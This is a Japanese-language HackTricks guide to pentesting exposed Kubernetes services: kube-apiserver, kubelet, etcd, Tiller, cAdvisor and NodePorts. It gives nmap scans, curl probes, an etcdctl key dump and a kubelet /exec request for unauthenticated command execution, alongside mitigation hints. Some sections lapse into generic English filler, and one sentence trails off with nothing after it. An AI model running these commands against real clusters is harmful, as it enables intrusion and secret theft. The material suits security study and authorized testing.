# Kubernetesサービスのペンテスト

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もし **HackTricksであなたの会社を宣伝したい**場合や、**PEASSの最新バージョンにアクセスしたい**場合、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。これは私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

Kubernetesはいくつかの**特定のネットワークサービス**を使用しており、これらは**インターネットに公開されている**か、**1つのポッドを侵害した後の内部ネットワーク**で見つけることができるかもしれません。

## OSINTを使用した公開されたポッドの検索

一つの方法は、[crt.sh](https://crt.sh)で`Identity LIKE "k8s.%.com"`を検索して、kubernetesに関連するサブドメインを見つけることです。別の方法は、githubで`"k8s.%.com"`を検索し、その文字列を含む**YAMLファイル**を検索することです。

## Kubernetesがサービスを公開する方法

サービスを公開するためにKubernetesがどのように機能するかを理解すると役立つかもしれません:

{% content-ref url="exposing-services-in-kubernetes.md" %}
[exposing-services-in-kubernetes.md](exposing-services-in-kubernetes.md)
{% endcontent-ref %}

## ポートスキャンによる公開されたポッドの検索

Kubernetesクラスターでは、次のポートが開いている可能性があります:

| ポート           | プロセス        | 説明                                                                   |
| --------------- | -------------- | ---------------------------------------------------------------------- |
| 443/TCP         | kube-apiserver | Kubernetes APIポート                                                   |
| 2379/TCP        | etcd           |                                                                        |
| 6666/TCP        | etcd           | etcd                                                                   |
| 4194/TCP        | cAdvisor       | コンテナのメトリクス                                                   |
| 6443/TCP        | kube-apiserver | Kubernetes APIポート                                                   |
| 8443/TCP        | kube-apiserver | Minikube APIポート                                                     |
| 8080/TCP        | kube-apiserver | セキュリティのないAPIポート                                             |
| 10250/TCP       | kubelet        | フルモードアクセスを許可するHTTPS API                                   |
| 10255/TCP       | kubelet        | 認証されていない読み取り専用HTTPポート: ポッド、実行中のポッド、ノードの状態 |
| 10256/TCP       | kube-proxy     | Kube Proxyヘルスチェックサーバー                                        |
| 9099/TCP        | calico-felix   | Calicoのヘルスチェックサーバー                                          |
| 6782-4/TCP      | weave          | メトリクスとエンドポイント                                               |
| 30000-32767/TCP | NodePort       | サービスへのプロキシ                                                    |
| 44134/TCP       | Tiller         | Helmサービスのリスニング                                                |

### Nmap
```
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
```
### Kube-apiserver

これは、通常、管理者がツール**`kubectl`**を使用して話す**API Kubernetesサービス**です。

一般的なポートは6443と443ですが、minikubeでは8443、非セキュアな場合は8080も使用されます。
```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```
**次のページをチェックして、このサービスとのやり取りで機密データを取得し、機密なアクションを実行する方法を学びます:**

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

### Kubelet API

このサービスは**クラスターの各ノードで実行されます**。これは**ノード**内のポッドを**制御**するサービスです。**kube-apiserver**と通信します。

このサービスが公開されている場合、**認証されていないRCE**を見つけた可能性があります。

#### Kubelet API
```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```
もしレスポンスが`Unauthorized`であれば、認証が必要です。

ノードの一覧を取得することができれば、以下のコマンドでkubeletのエンドポイントの一覧を取得できます。
```bash
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
ip=$(echo $node | awk '{print $1}')
port=$(echo $node | awk '{print $2}')
echo "curl -k --max-time 30 https://$ip:$port/pods"
echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```
#### kubelet（読み取り専用）

The kubelet is the primary node agent that runs on each node in a Kubernetes cluster. It is responsible for managing the containers and their lifecycle on the node. As a pentester, you can gain read-only access to the kubelet to gather information about the running containers and their configurations.

To exploit this, you can use the following techniques:

1. **Unauthenticated Access**: In some cases, the kubelet may be exposed without authentication. You can simply access the kubelet's API endpoint and retrieve information about the containers running on the node.

2. **API Server Misconfiguration**: If the kubelet is configured to use the Kubernetes API server for authentication and authorization, you can try to exploit misconfigurations in the API server to gain unauthorized access to the kubelet.

3. **Insecure Defaults**: The kubelet may have insecure defaults that allow unauthorized access. For example, it may have insecure permissions set on its API endpoint or allow unauthenticated requests.

To protect against these attacks, it is important to secure the kubelet by enabling authentication and authorization, configuring secure defaults, and regularly updating Kubernetes to patch any vulnerabilities.
```
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```
### etcd API

The etcd API is a key-value store used by Kubernetes to store cluster configuration data. It is important to understand the security implications of the etcd API and how to properly test it during a penetration test.

#### Default Configuration

By default, the etcd API is not exposed externally and can only be accessed from within the Kubernetes cluster. However, misconfigurations or insecure deployments can lead to the etcd API being exposed to the internet, allowing unauthorized access to sensitive data.

#### Testing for Exposed etcd API

During a penetration test, it is important to check if the etcd API is exposed externally. This can be done by scanning the target network for open ports, specifically port 2379 (the default port for the etcd API). If the port is open and accessible from the internet, further testing should be conducted to identify any potential vulnerabilities.

#### Exploiting Exposed etcd API

If the etcd API is exposed externally, an attacker can potentially exploit it to gain unauthorized access to sensitive data or even take control of the Kubernetes cluster. Common vulnerabilities include weak or default credentials, unauthenticated access, and insecure communication.

To exploit these vulnerabilities, an attacker can use tools like `etcdctl` to interact with the etcd API and perform actions such as reading or modifying key-value pairs. It is important to note that exploiting the etcd API requires a deep understanding of the Kubernetes cluster's configuration and the etcd data model.

#### Mitigation

To mitigate the risk of an exposed etcd API, it is recommended to follow security best practices when deploying Kubernetes clusters. This includes ensuring that the etcd API is not exposed externally, using strong authentication and authorization mechanisms, and encrypting communication between etcd nodes.

Regular security assessments and penetration tests should also be conducted to identify and address any vulnerabilities in the etcd API and the overall Kubernetes cluster.
```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### Tiller

Tillerは、Kubernetesクラスター内でHelmチャートを管理するためのサーバーサイドコンポーネントです。Tillerは、Helmクライアントからのリクエストを受け取り、クラスター内のリソースを操作してチャートのインストール、アップグレード、削除などを実行します。

Tillerは、デフォルトではクラスター内のすべてのネームスペースにアクセスできる権限を持っています。これは、悪意のあるユーザーがTillerを悪用してクラスター内のリソースを攻撃する可能性を高めることがあります。

Tillerのセキュリティを向上させるためには、以下の手順を実行することが推奨されます。

1. Tillerのサービスアカウントを制限する: Tillerには、クラスター内のすべてのネームスペースにアクセスできる権限がデフォルトで与えられていますが、必要な権限のみを持つサービスアカウントを作成し、Tillerに割り当てることができます。

2. TillerのRBACを設定する: Role-Based Access Control（RBAC）を使用して、Tillerに与えられる権限を制限することができます。必要な権限のみを持つロールとロールバインディングを作成し、Tillerに割り当てることができます。

3. Tillerのネットワークアクセスを制限する: Tillerはデフォルトでクラスター内のすべてのネームスペースにアクセスできますが、必要な場合にのみアクセスできるようにネットワークポリシーを設定することができます。

4. Tillerのバージョンを最新に保つ: Tillerの最新バージョンにアップグレードすることで、セキュリティの脆弱性が修正され、より安全な状態になります。

これらの手順を実行することで、Tillerのセキュリティを向上させることができます。
```
helm --host tiller-deploy.kube-system:44134 version
```
このサービスを悪用することで、Kubernetes内で特権をエスカレーションすることができます：

### cAdvisor

メトリクスを収集するために役立つサービスです。
```
curl -k https://<IP Address>:4194
```
### NodePort

ノードポートを介してポートが公開されると、同じポートがすべてのノードで開かれ、トラフィックが宣言されたサービスにプロキシされます。デフォルトでは、このポートは**30000-32767の範囲**にあります。したがって、新しい未チェックのサービスはこれらのポートを介してアクセス可能になる可能性があります。
```
sudo nmap -sS -p 30000-32767 <IP>
```
## 脆弱な設定ミス

### Kube-apiserverの匿名アクセス

**デフォルトでは**、**kube-apiserver**のAPIエンドポイントは**匿名**アクセスが**禁止**されています。しかし、**機密情報を公開する脆弱なエンドポイント**が存在しないか確認することは常に良いアイデアです。

![](https://www.cyberark.com/wp-content/uploads/2019/09/Kube-Pen-2-fig-5.png)

### ETCDの匿名アクセスのチェック

ETCDはクラスタの秘密、設定ファイルなどの**機密データ**を保存しています。**デフォルトでは**、ETCDは**匿名**でアクセスできませんが、常にチェックすることが良いでしょう。

ETCDに匿名でアクセスできる場合、[etcdctl](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md)ツールを使用する必要があります。次のコマンドで保存されているすべてのキーを取得できます：
```
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### **Kubelet RCE**

[Kubeletのドキュメント](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)によれば、**デフォルトではサービスへの匿名アクセスが許可されています**：

> Kubeletサーバーへの匿名リクエストを有効にします。他の認証方法によって拒否されないリクエストは匿名リクエストとして扱われます。匿名リクエストのユーザー名は `system:anonymous` で、グループ名は `system:unauthenticated` です。

**Kubelet APIの認証と認可の仕組み**をより理解するために、このページを参照してください：

{% content-ref url="../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

**Kubelet**サービスの**APIはドキュメント化されていません**が、ソースコードはここで見つけることができます。公開されたエンドポイントを見つけるのは簡単です。以下のコマンドを実行してください：
```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'

Path("/pods").
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
Path("/runningpods/").
```
#### /pods

このエンドポイントは、ポッドとそのコンテナの一覧を表示します：
```bash
curl -ks https://worker:10250/pods
```
#### /exec

このエンドポイントは、どのコンテナでも簡単にコードを実行することができます。
```bash
# Tthe command is passed as an array (split by spaces) and that is a GET request.
curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} \
-d 'input=1' -d 'output=1' -d 'tty=1'                             \
-d 'command=ls' -d 'command=/'
```
自動化された攻撃を行うために、[**kubelet-anon-rce**](https://github.com/serain/kubelet-anon-rce)というスクリプトを使用することもできます。

{% hint style="info" %}
この攻撃を回避するためには、_**kubelet**_ サービスを `--anonymous-auth false` オプションで実行し、サービスをネットワークレベルで分離する必要があります。
{% endhint %}

### **Kubelet (読み取り専用ポート) の情報漏洩のチェック**

**kubeletの読み取り専用ポート**が公開されている場合、攻撃者はAPIから情報を取得することができます。これにより、**ポッドの名前、内部ファイルの場所、その他の設定**など、クラスタの構成要素が公開されます。これは重要な情報ではありませんが、インターネットに公開されるべきではありません。

たとえば、リモート攻撃者は次のURLにアクセスすることでこれを悪用することができます：`http://<external-IP>:10255/pods`

![](https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png)

## 参考文献

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2" %}

{% embed url="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet" %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もしもあなたの**会社をHackTricksで宣伝したい**場合や、**最新版のPEASSやHackTricksのPDFをダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローしてください。
* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有しましょう。

</details>
